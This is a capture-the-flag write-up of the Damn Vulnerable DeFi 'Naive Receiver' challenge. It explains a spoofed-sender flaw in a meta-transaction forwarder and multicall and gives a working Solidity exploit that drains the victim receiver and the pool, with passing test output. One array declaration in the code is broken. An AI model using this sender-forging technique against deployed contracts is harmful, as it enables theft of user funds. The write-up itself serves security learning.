 
## Naive Receiver Challenge

---

### Challenge Overview

This challenge exploits an **access control flaw** in a meta-transaction system combined with a flashloan fee mechanism. A vulnerable pool offers flashloans with a fixed 1 WETH fee. The victim (user) has a receiver contract with 10 WETH balance and unknowingly becomes the target of draining attacks via flashloans.

The objective is to **drain all WETH** from both the pool and the user’s receiver contract, and deposit the funds into a designated recovery address.

---

### Smart Contract Breakdown

#### Key Contracts
- **NaiveReceiverPool**: Offers flashloans of WETH with a fixed fee of 1 WETH per call.
- **FlashLoanReceiver**: A sample user-deployed contract able to receive flashloans.
- **BasicForwarder**: A meta-transaction forwarder that allows execution of calls on behalf of users via valid signatures.

#### Important Mechanisms
- **flashLoan(address receiver, address token, uint256 amount, bytes calldata data)**  
  Executes a flashloan and charges a 1 WETH fee, regardless of loan amount.
- **multicall(bytes[] calldata data)**  
  Allows batching of multiple calls in a single transaction.
- **forwarder.execute(request, signature)**  
  Permits off-chain signed execution of calls via the meta-transaction forwarder.

---

### ⚠️ Vulnerability Explained

The **forwarder** blindly trusts the sender field embedded in the calldata of `withdraw()` when processed via `multicall()`. This creates a **spoofable sender** situation. An attacker can:
1. Encode a series of flashloan calls to drain the victim receiver's balance.
2. Add a `withdraw()` call to extract all funds from the pool by spoofing ownership using `abi.encodePacked(...)`.
3. Sign the entire payload off-chain and have the forwarder execute it.

---

### Exploit Strategy

1. Encode 10 consecutive flashloans that charge the victim's receiver 1 WETH each (draining 10 WETH total).
2. Encode a `withdraw()` call that drains both pool and receiver funds.
3. Combine calls using `multicall()`.
4. Forge the sender identity by packing the deployer address at the end of the call data.
5. Execute the entire call using `forwarder.execute()` with a valid EIP-712 signature.

---

### Exploit Code (Solidity)

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes ;

    for (uint i = 0; i < 10; i++) {
        callDatas[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 0, "0x")
        );
    }

    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
```

### Proof of Exploit:
```yaml
[PASS] test_naiveReceiver() (gas: 477289)

Balance assertions:
WETH in FlashLoanReceiver: 0
WETH in NaiveReceiverPool: 0
WETH in recovery: 1010 WETH (successfully rescued all funds)

```

🔗 **GitHub**: [View](https://github.com/BLOCK-PROGRAMR/SCATER70/tree/main/ctf/damn-vulnerable-defi)